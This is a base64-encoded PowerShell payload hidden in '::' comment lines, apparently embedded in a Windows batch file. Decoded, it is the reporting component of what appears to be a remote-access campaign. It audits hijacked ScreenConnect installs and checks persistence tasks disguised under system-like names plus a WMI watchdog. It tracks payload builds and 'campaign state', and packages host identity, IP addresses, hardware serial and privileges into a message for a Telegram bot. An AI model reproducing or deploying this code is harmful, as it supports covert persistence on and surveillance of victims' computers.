::JGdyeXhhRnAgPSBHZXQtR3J5eGFLZWVwRnANCiAgICAkbGlzdCA9IE5ldy1PYmpl
::Y3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAg
::R2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVy
::ZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0IENsaWVudCon
::IH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRmcCA9IGlmICgkXy5OYW1l
::IC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgeyAkbWF0Y2hlc1sxXSB9IGVs
::c2UgeyAnPycgfQ0KICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3
::OTg1MmU1MDcnKSB7ICdLRUVQLVNFVlJaJyB9DQogICAgICAgIGVsc2VpZiAoJGZw
::IC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJ0tFRVAtQUxUJyB9DQogICAgICAg
::IGVsc2VpZiAoJGZwIC1lcSAkZ3J5eGFGcCkgeyAnS0VFUC1HUllYQScgfQ0KICAg
::ICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0NCiAgICAgICAgW3ZvaWRdJGxpc3QuQWRk
::KCgnLSA8Y29kZT57MH08L2NvZGU+OiA8Yj57MX08L2I+IFt7Mn1dJyAtZiAoRXNj
::ICRfLk5hbWUpLCAoRXNjIChbc3RyaW5nXSRfLlN0YXR1cykpLCAkdGFnKSkNCiAg
::ICB9DQoNCiAgICAkcm9vdHMgPSBAKA0KICAgICAgICAiJHtlbnY6UHJvZ3JhbUZp
::bGVzfVxTY3JlZW5Db25uZWN0IENsaWVudCoiLA0KICAgICAgICAiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiINCiAgICApDQog
::ICAgZm9yZWFjaCAoJHBhdCBpbiAkcm9vdHMpIHsNCiAgICAgICAgR2V0LUNoaWxk
::SXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBbdm9pZF0k
::bGlzdC5BZGQoKCctIHBhdGg6IDxjb2RlPnswfTwvY29kZT4nIC1mIChFc2MgJF8u
::RnVsbE5hbWUpKSkNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICR1bmluc3QgPSBA
::KA0KICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3Vy
::cmVudFZlcnNpb25cVW5pbnN0YWxsXConLA0KICAgICAgICAnSEtMTTpcU09GVFdB
::UkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25c
::VW5pbnN0YWxsXConDQogICAgKQ0KICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmlu
::c3QpIHsNCiAgICAgICAgR2V0LUl0ZW1Qcm9wZXJ0eSAkcGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7DQogICAgICAgICAg
::ICAkXy5EaXNwbGF5TmFtZSAtbGlrZSAnKlNjcmVlbkNvbm5lY3QqJw0KICAgICAg
::ICB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJHZlciA9IGlmICgk
::Xy5EaXNwbGF5VmVyc2lvbikgeyAkXy5EaXNwbGF5VmVyc2lvbiB9IGVsc2UgeyAn
::PycgfQ0KICAgICAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgnLSBtc2k6IDxjb2Rl
::PnswfTwvY29kZT4gdnsxfScgLWYgKEVzYyAkXy5EaXNwbGF5TmFtZSksIChFc2Mg
::JHZlcikpKQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKCRsaXN0LkNvdW50
::IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9uZSknKSB9DQogICAgcmV0
::dXJuICRsaXN0DQp9DQoNCiRjZmcgPSBHZXQtQ2ZnDQppZiAoLW5vdCAkY2ZnLkJP
::VF9UT0tFTiAtb3IgLW5vdCAkY2ZnLkNIQVRfSUQpIHsNCiAgICBBZGQtQ29udGVu
::dCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAt
::VmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZQ0KICAgIGV4aXQgMg0KfQ0KDQokcHJpbSA9ICdTY3JlZW5Db25uZWN0IENs
::aWVudCAoNWY2MDEwNTc5ODUyZTUwNyknDQokYWx0ID0gJ1NjcmVlbkNvbm5lY3Qg
::Q2xpZW50IChmODYxYzgxNDBkNDUzNDI3KScNCiRvcyA9IEdldC1Pc0luZm8NCiR3
::aG8gPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1
::cnJlbnQoKS5OYW1lDQokZWxldiA9IChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRv
::d3NQcmluY2lwYWxdW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHld
::OjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKA0KICAgIFtTZWN1cml0eS5QcmluY2lw
::YWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikNCiRpc1N5c3Rl
::bSA9ICR3aG8gLWxpa2UgJypTWVNURU0qJyAtb3IgJHdobyAtZXEgJ05UIEFVVEhP
::UklUWVxTWVNURU0nDQoNCiRtc2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0RpciAn
::cGtnLm1zaScNCiRtc2lTaXplID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsN
::CiAgICAnezA6TjB9IEtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2Up
::Lkxlbmd0aCAvIDFLQikNCn0gZWxzZSB7ICdub25lJyB9DQoNCiRtb25QYXRoID0g
::Sm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcNCiRldGxNb24gPSAiJGVu
::djpQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNo
::ZVxldGxfbW9uLmNtZCINCiRoYXNNb24gPSBUZXN0LVBhdGggJG1vblBhdGgNCiRo
::YXNFdGwgPSBUZXN0LVBhdGggJGV0bE1vbg0KDQojIFQxMDogb24tZGlzayBwYXls
::b2FkIGJ1aWxkIG1hcmtlcnMgLT4gZXZlcnkgcmVwb3J0IHByb3ZlcyBleGFjdGx5
::IHdoYXQgaXMgaW5zdGFsbGVkDQpmdW5jdGlvbiBHZXQtUGF5bG9hZEJ1aWxkKFtz
::dHJpbmddJGZpbGUpIHsNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkg
::eyByZXR1cm4gJ21pc3NpbmcnIH0NCiAgICBmb3JlYWNoICgkbCBpbiAoR2V0LUNv
::bnRlbnQgLUxpdGVyYWxQYXRoICRmaWxlIC1Ub3RhbENvdW50IDggLUZvcmNlIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICBpZiAoJGwg
::LW1hdGNoICdCVUlMRFxzK1xkezh9KFtBLVpdK1xkKyknKSB7IHJldHVybiAkbWF0
::Y2hlc1sxXSB9DQogICAgfQ0KICAgIHJldHVybiAnPycNCn0NCiRiTW9uID0gR2V0
::LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcp
::DQokYlNlYyA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAn
::b3duX3NlY3VyZS5jbWQnKQ0KJGJUZ3IgPSBHZXQtUGF5bG9hZEJ1aWxkIChKb2lu
::LVBhdGggJFdvcmtEaXIgJ3RnX3JlcG9ydC5wczEnKQ0KJGJMaWIgPSBHZXQtUGF5
::bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykNCg0K
::IyBwZXItaG9zdCBpZGVudGl0eTogZXhwZWN0ZWQgdGFzayBuYW1lcyBjb21lIGZy
::b20gaWRlbnRpdHkuY2ZnIHdoZW4gcHJlc2VudA0KJGlkQ2ZnID0gSm9pbi1QYXRo
::ICRXb3JrRGlyICdpZGVudGl0eS5jZmcnDQokaWRNYXAgPSBAe30NCmlmIChUZXN0
::LVBhdGggJGlkQ2ZnKSB7DQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRp
::ZENmZyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKCRfIC1tYXRjaCAn
::XlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZE1hcFskbWF0Y2hl
::c1sxXV0gPSAkbWF0Y2hlc1syXSB9DQogICAgfQ0KfQ0KJGV4cGVjdGVkVGFza3Mg
::PSBAKA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19BKSB7ICRpZE1h
::cC5UQVNLX0EgfSBlbHNlIHsgJ1dlclF1ZXVlU3luYycgfSk7IFJvbGUgPSAidGlj
::ayAkKCRpZE1hcC5NT19BKW0gKGNoYWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQo
::aWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAnUGxh
::U2VydmVySGVhbHRoJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQilt
::IChjaGFpbjEpIiB9LA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19D
::KSB7ICRpZE1hcC5UQVNLX0MgfSBlbHNlIHsgJ1dkaUhvc3RQcm94eScgfSk7IFJv
::bGUgPSAnT05TVEFSVCAoY2hhaW4xKScgfSwNCiAgICBAeyBOYW1lID0gJChpZiAo
::JGlkTWFwLlRBU0tfRCkgeyAkaWRNYXAuVEFTS19EIH0gZWxzZSB7ICdUY3BJcENv
::bmZsaWN0UmVzJyB9KTsgUm9sZSA9ICdPTkxPR09OIChjaGFpbjEpJyB9DQopDQoj
::IGNoYWluIDI6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24NCiR3bWlDID0gR2V0
::LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBD
::b21tYW5kTGluZUV2ZW50Q29uc3VtZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdh
::dGNoZG9nQyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQokZXhwZWN0
::ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdhdGNoZG9nQyc7IFJv
::bGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5lICR3bWlD
::KSB9DQoNCiR0YXNrTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9u
::cy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0KJHRhc2tPayA9IDANCiR0YXNrQmFkID0g
::MA0KZm9yZWFjaCAoJHQgaW4gJGV4cGVjdGVkVGFza3MpIHsNCiAgICBpZiAoJHQu
::Q29udGFpbnNLZXkoJ1dtaScpKSB7DQogICAgICAgIGlmICgkdC5XbWkpIHsgJHRh
::c2tPaysrOyAkbWFyayA9ICdPSycgfSBlbHNlIHsgJHRhc2tCYWQrKzsgJG1hcmsg
::PSAnTUlTU0lORycgfQ0KICAgICAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0g
::W3swfV0gPGNvZGU+ezF9PC9jb2RlPiAtIHsyfScgLWYgJG1hcmssIChFc2MgJHQu
::TmFtZSksIChFc2MgJHQuUm9sZSkpKQ0KICAgICAgICBjb250aW51ZQ0KICAgIH0N
::CiAgICAkaCA9IEdldC1UYXNrSGVhbHRoICR0Lk5hbWUNCiAgICBpZiAoJGguUHJl
::c2VudCAtYW5kICRoLkhlYWx0aHkpIHsNCiAgICAgICAgJHRhc2tPaysrDQogICAg
::ICAgICRtYXJrID0gJ09LJw0KICAgIH0gZWxzZWlmICgkaC5QcmVzZW50IC1hbmQg
::LW5vdCAkaC5PdXJzKSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1h
::cmsgPSAnTk9UX09VUlMnDQogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsNCiAg
::ICAgICAgJHRhc2tCYWQrKw0KICAgICAgICAkbWFyayA9ICdXRUFLJw0KICAgIH0g
::ZWxzZSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1hcmsgPSAnTUlT
::U0lORycNCiAgICB9DQogICAgJGV4dHJhID0gJycNCiAgICBpZiAoJGguUHJlc2Vu
::dCkgew0KICAgICAgICAkYml0cyA9IEAoKQ0KICAgICAgICBpZiAoJGguU3RhdHVz
::KSB7ICRiaXRzICs9ICRoLlN0YXR1cyB9DQogICAgICAgIGlmICgkaC5SZXN1bHQg
::LW5lICcnIC1hbmQgJGguUmVzdWx0IC1uZSAnMCcpIHsgJGJpdHMgKz0gKCJMYXN0
::UmVzdWx0PSIgKyAkaC5SZXN1bHQpIH0NCiAgICAgICAgaWYgKCRiaXRzLkNvdW50
::KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywgJykgKyAnKScgfQ0K
::ICAgIH0NCiAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0gW3swfV0gPGNvZGU+
::ezF9PC9jb2RlPiAtIHsyfXszfScgLWYgJG1hcmssIChFc2MgJHQuTmFtZSksIChF
::c2MgJHQuUm9sZSksIChFc2MgJGV4dHJhKSkpDQp9DQoNCiRwcmltTGluZSA9IEdl
::dC1TdmNMaW5lICRwcmltDQokYWx0TGluZSA9IEdldC1TdmNMaW5lICRhbHQNCiRw
::cmltT2sgPSAkcHJpbUxpbmUgLWxpa2UgJ1J1bm5pbmcqJw0KJGRlcGxveU9rID0g
::JHByaW1PayAtYW5kICgkdGFza09rIC1nZSAzKSAtYW5kICRoYXNNb24NCg0KJGVt
::b2ppTWFwID0gQHsNCiAgICBPSyAgICAgICA9IFtzdHJpbmddKFtjaGFyXTB4Mjcw
::NSkNCiAgICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21V
::dGYzMigweDFGNkE4KSkNCiAgICBSRVNUT1JFRCA9IChbc3RyaW5nXVtjaGFyXTo6
::Q29udmVydEZyb21VdGYzMigweDFGN0UyKSkNCiAgICBGQUlMICAgICA9IFtzdHJp
::bmddKFtjaGFyXTB4Mjc0QykNCiAgICBGT1JDRSAgICA9IFtzdHJpbmddKFtjaGFy
::XTB4MjZBMSkNCiAgICBERVBMT1kgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVy
::dEZyb21VdGYzMigweDFGNjgwKSkNCiAgICBIQiAgICAgICA9IChbc3RyaW5nXVtj
::aGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNEUxKSkNCn0NCiRrZXkgPSAkU3Rh
::dGUuVG9VcHBlckludmFyaWFudCgpDQokZW1vamkgPSBpZiAoJGVtb2ppTWFwLkNv
::bnRhaW5zS2V5KCRrZXkpKSB7ICRlbW9qaU1hcFska2V5XSB9IGVsc2UgeyAoW3N0
::cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRGMSkpIH0NCg0KJHRp
::dGxlID0gc3dpdGNoICgka2V5KSB7DQogICAgJ09LJyB7ICdQcmltYXJ5IGhlYWx0
::aHknIH0NCiAgICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQ0K
::ICAgICdSRVNUT1JFRCcgeyAnUHJpbWFyeSBSRVNUT1JFRCcgfQ0KICAgICdGQUlM
::JyB7ICdIZWFsIEZBSUxFRCcgfQ0KICAgICdGT1JDRScgeyAnRm9yY2VkIHJlaW5z
::dGFsbCcgfQ0KICAgICdERVBMT1knIHsgaWYgKCRkZXBsb3lPaykgeyAnRklSU1Qg
::REVQTE9ZIE9LJyB9IGVsc2UgeyAnRklSU1QgREVQTE9ZIC0gQ0hFQ0sgTkVFREVE
::JyB9IH0NCiAgICAnSEInIHsgJ2hvdXJseSBkaWdlc3QnIH0NCiAgICBkZWZhdWx0
::IHsgIlN0YXRlOiAkU3RhdGUiIH0NCn0NCg0KJHRyYW5zID0gaWYgKCRPbGRTdGF0
::ZSkgeyAiJE9sZFN0YXRlIC0+ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0NCiRz
::Y0xpc3QgPSBHZXQtU2NJbnN0YWxscw0KJHJtbUhpdHMgPSBHZXQtUm1tSGl0cw0K
::aWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1IaXRzLkFkZCgn
::LSAobm9uZSBkZXRlY3RlZCknKSB9DQoNCiRwdWIgPSBHZXQtUHVibGljSXANCiRs
::YW4gPSBHZXQtTG9jYWxJcHMNCiRub3cgPSBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5
::LU1NLWRkIEhIOm1tOnNzIHp6eicNCiR1cHRpbWUgPSAnbi9hJw0KdHJ5IHsNCiAg
::ICAkYm9vdCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVt
::KS5MYXN0Qm9vdFVwVGltZQ0KICAgICR1cHRpbWUgPSAnezA6ZGR9ZCB7MDpoaH1o
::IHswOm1tfW0nIC1mICgoR2V0LURhdGUpIC0gJGJvb3QpDQp9IGNhdGNoIHt9DQoN
::CiMgY2FtcGFpZ24gc3RhdGUgZmlsZSAod3JpdHRlbiBieSBvd25fbGliLnBzMSBz
::dGF0ZSBhY3Rpb24pDQokc3RhdGVMaW5lID0gJ24vYScNCiRzdGF0ZU9iaiA9ICRu
::dWxsDQokc3RhdGVQYXRoMiA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNv
::bicNCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIpIHsNCiAgICAkcmF3U3RhdGUg
::PSAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGgyIC1SYXcpLlRy
::aW0oKQ0KICAgIHRyeSB7DQogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8
::IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICAgJGZvcmVpZ25Dc3YgPSBpZiAoJHN0
::YXRlT2JqLmZvcmVpZ24pIHsgKCRzdGF0ZU9iai5mb3JlaWduIC1qb2luICcsJykg
::fSBlbHNlIHsgJy0nIH0NCiAgICAgICAgJHN0YXRlTGluZSA9ICJwcmltPSQoJHN0
::YXRlT2JqLnByaW0pIGFsdD0kKCRzdGF0ZU9iai5hbHQpIGZvcmVpZ249WyRmb3Jl
::aWduQ3N2XSB0YXNrcz0kKCRzdGF0ZU9iai50YXNrc09rKS8kKCRzdGF0ZU9iai50
::YXNrc1RvdGFsKSB3ZD0kKCRzdGF0ZU9iai53YXRjaGRvZykgaGVhbHM9JCgkc3Rh
::dGVPYmouaW5zdGFsbENvdW50KSINCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9
::ICRyYXdTdGF0ZSB9DQp9DQoNCiRkZXBsb3lCbG9jayA9ICcnDQppZiAoJGtleSAt
::ZXEgJ0RFUExPWScpIHsNCiAgICAkdmVyZGljdCA9IGlmICgkZGVwbG95T2spIHsg
::J0RFUExPWUVEIC8gSEVBTFRIWScgfSBlbHNlIHsgJ0RFUExPWUVEIEJVVCBJTkNP
::TVBMRVRFJyB9DQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBhdGgg
::IiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtl
::bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURp
::cmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAg
::IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW5vdG1hdGNoICgiNWY2MDEwNTc5ODUy
::ZTUwN3xmODYxYzgxNDBkNDUzNDI3fHswfSIgLWYgKEdldC1Hcnl4YUtlZXBGcCkp
::IH0pDQogICAgJGRpYWdMaW5lcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rp
::b25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJGJvb3RQYXRoID0gSm9pbi1Q
::YXRoICRXb3JrRGlyICdib290LmVycicNCiAgICBpZiAoVGVzdC1QYXRoICRib290
::UGF0aCkgew0KICAgICAgICAkaW50ZXJlc3RpbmcgPSBAKA0KICAgICAgICAgICAg
::J21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlfJywgJ251a2VfJywgJ21zaV90b28n
::LCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywNCiAgICAgICAgICAgICdtc2lfdW5h
::dmFpbGFibGUnLCAnc2VjdXJlXycsICdnb18nLCAnZXh0ZXJtaW5hdGVfJywgJ2lk
::ZW50aXR5XycsDQogICAgICAgICAgICAnY3JlYXRlX3Rhc2snLCAndmVyaWZ5X3Rh
::c2snLCAnb3JwaGFuXycsICdzdGFsZV8nLCAncG9zdGluc3RhbGwnLCAnYWx0XycN
::CiAgICAgICAgKQ0KICAgICAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGJv
::b3RQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAg
::ICAgIFdoZXJlLU9iamVjdCB7DQogICAgICAgICAgICAgICAgJGxpbmUgPSAkXw0K
::ICAgICAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICRpbnRlcmVzdGluZykgeyBp
::ZiAoJGxpbmUgLWxpa2UgIiokdCoiKSB7IHJldHVybiAkdHJ1ZSB9IH0NCiAgICAg
::ICAgICAgICAgICAkZmFsc2UNCiAgICAgICAgICAgIH0gfA0KICAgICAgICAgICAg
::U2VsZWN0LU9iamVjdCAtTGFzdCAyNiB8DQogICAgICAgICAgICBGb3JFYWNoLU9i
::amVjdCB7IFt2b2lkXSRkaWFnTGluZXMuQWRkKCgnLSA8Y29kZT57MH08L2NvZGU+
::JyAtZiAoRXNjICgkXyAtcmVwbGFjZSAnW15ceDIwLVx4N0VdJywgJz8nKSkpKSB9
::DQogICAgfQ0KICAgIGlmICgkZGlhZ0xpbmVzLkNvdW50IC1lcSAwKSB7IFt2b2lk
::XSRkaWFnTGluZXMuQWRkKCctIChubyBpbnN0YWxsL251a2UgbWFya2VycyBpbiBi
::b290LmVyciknKSB9DQogICAgJGRlcGxveUJsb2NrID0gQCINCg0KPGI+RGVwbG95
::IHZlcmRpY3Q8L2I+DQotIFJlc3VsdDogPGI+JChFc2MgJHZlcmRpY3QpPC9iPg0K
::LSBQcmltYXJ5IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsgJ1lFUycgfSBlbHNl
::IHsgJ05PJyB9KQ0KLSBNb25pdG9yIHNjcmlwdCAoLnd1Y2FjaGVcb3duX21vbi5j
::bWQpOiAkKGlmICgkaGFzTW9uKSB7ICdZRVMnIH0gZWxzZSB7ICdOTycgfSkNCi0g
::QmFja3VwIG1vbiAoLmV0bGNhY2hlXGV0bF9tb24uY21kKTogJChpZiAoJGhhc0V0
::bCkgeyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIFBlcnNpc3QgdGFza3MgT0s6
::ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tzLkNvdW50KSAoYmFkL21pc3Npbmc6
::ICR0YXNrQmFkKQ0KLSBNU0kgY2FjaGU6ICQoRXNjICRtc2lTaXplKQ0KLSBGb3Jl
::aWduIFNDIGZvbGRlcnMgbGVmdDogJCgkZm9yZWlnbi5Db3VudCkNCi0gTm90ZTog
::TGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5ZXQgcnVuIChub3JtYWwgcmln
::aHQgYWZ0ZXIgY3JlYXRlKQ0KDQo8Yj5EZXBsb3kgbG9nIG1hcmtlcnM8L2I+DQok
::KCRkaWFnTGluZXMgLWpvaW4gImBuIikNCiJADQp9DQoNCiR0ZXh0ID0gQCINCiRl
::bW9qaSA8Yj5TQyBNb25pdG9yIC0gJChFc2MgJHRpdGxlKTwvYj4NCg0KPGI+RXZl
::bnQ8L2I+DQotIFN1bW1hcnk6ICQoRXNjICRTdW1tYXJ5KQ0KLSBUcmFuc2l0aW9u
::OiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPg0KLSBXaGVuOiAkKEVzYyAkbm93
::KQ0KLSBTb3VyY2UgYnVpbGQ6IDxjb2RlPiQoRXNjICRCdWlsZCk8L2NvZGU+DQok
::ZGVwbG95QmxvY2sNCg0KPGI+SG9zdDwvYj4NCi0gQ29tcHV0ZXI6IDxjb2RlPiQo
::RXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4NCi0gVXNlcjogPGNvZGU+JChF
::c2MgJHdobyk8L2NvZGU+DQotIEVsZXZhdGVkOiAkZWxldiB8IFNZU1RFTTogJGlz
::U3lzdGVtDQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pDQoN
::CjxiPk5ldHdvcms8L2I+DQotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4pPC9j
::b2RlPg0KLSBQdWJsaWMgSVA6IDxjb2RlPiQoRXNjICRwdWIpPC9jb2RlPg0KDQo8
::Yj5PUyAvIEhhcmR3YXJlPC9iPg0KLSBPUzogJChFc2MgJG9zLkNhcHRpb24pDQot
::IFZlcnNpb246ICQoRXNjICRvcy5WZXJzaW9uKSAoYnVpbGQgJChFc2MgJG9zLkJ1
::aWxkKSkgJChFc2MgJG9zLkFyY2gpDQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0
::YWxsRGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkNCi0gVXB0
::aW1lOiAkKEVzYyAkdXB0aW1lKQ0KLSBDUFU6ICQoRXNjICRvcy5DUFUpDQotIEhh
::cmR3YXJlOiAkKEVzYyAkb3MuTWFudWZhY3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwp
::DQotIFNlcmlhbDogPGNvZGU+JChFc2MgJG9zLlNlcmlhbCk8L2NvZGU+DQotIFJB
::TTogJCgkb3MuVG90YWxSQU1fR0IpIEdCDQotIERpc2sgQzogJCgkb3MuRGlza0Zy
::ZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0INCg0KPGI+U2Ny
::ZWVuQ29ubmVjdCAoYWxsKTwvYj4NCi0gU2V2cnogPGNvZGU+NWY2MDEwNTc5ODUy
::ZTUwNzwvY29kZT46ICQoRXNjICRwcmltTGluZSkNCi0gQWx0IDxjb2RlPmY4NjFj
::ODE0MGQ0NTM0Mjc8L2NvZGU+OiAkKEVzYyAkYWx0TGluZSkNCi0gR3J5eGEgPGNv
::ZGU+JChFc2MgKEdldC1Hcnl4YUtlZXBGcCkpPC9jb2RlPjogJChFc2MgKEdldC1T
::dmNMaW5lICgiU2NyZWVuQ29ubmVjdCBDbGllbnQgKHswfSkiIC1mIChHZXQtR3J5
::eGFLZWVwRnApKSkpDQokKCRzY0xpc3QgLWpvaW4gImBuIikNCg0KPGI+T3RoZXIg
::Uk1NIC8gcmVtb3RlIHRvb2xzPC9iPg0KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQ0K
::DQo8Yj5QZXJzaXN0IHRhc2tzIChleHBlY3RlZCk8L2I+DQokKCR0YXNrTGluZXMg
::LWpvaW4gImBuIikNCg0KPGI+Q2FjaGU8L2I+DQotIE1TSSBjYWNoZTogJChFc2Mg
::JG1zaVNpemUpDQotIFdvcmtEaXI6IDxjb2RlPiQoRXNjICRXb3JrRGlyKTwvY29k
::ZT4NCg0KPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3Qp
::PC9iPg0KLSA8Y29kZT5NT049JGJNb24gfCBTRUM9JGJTZWMgfCBUR1I9JGJUZ3Ig
::fCBMSUI9JGJMaWI8L2NvZGU+DQoNCjxiPkNhbXBhaWduIHN0YXRlPC9iPg0KLSA8
::Y29kZT4kKEVzYyAkc3RhdGVMaW5lKTwvY29kZT4NCg0KPGk+Qm90OiBAbm9idWRk
::eXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4NCiJADQoNCiMgY29tcGFjdCBk
::aWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhl
::YXJ0YmVhdCkNCmlmICgkTW9kZSAtZXEgJ2NvbXBhY3QnKSB7DQogICAgJGZvcmVp
::Z25OID0gMA0KICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWln
::bikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9iai5mb3JlaWduKS5Db3VudCB9DQog
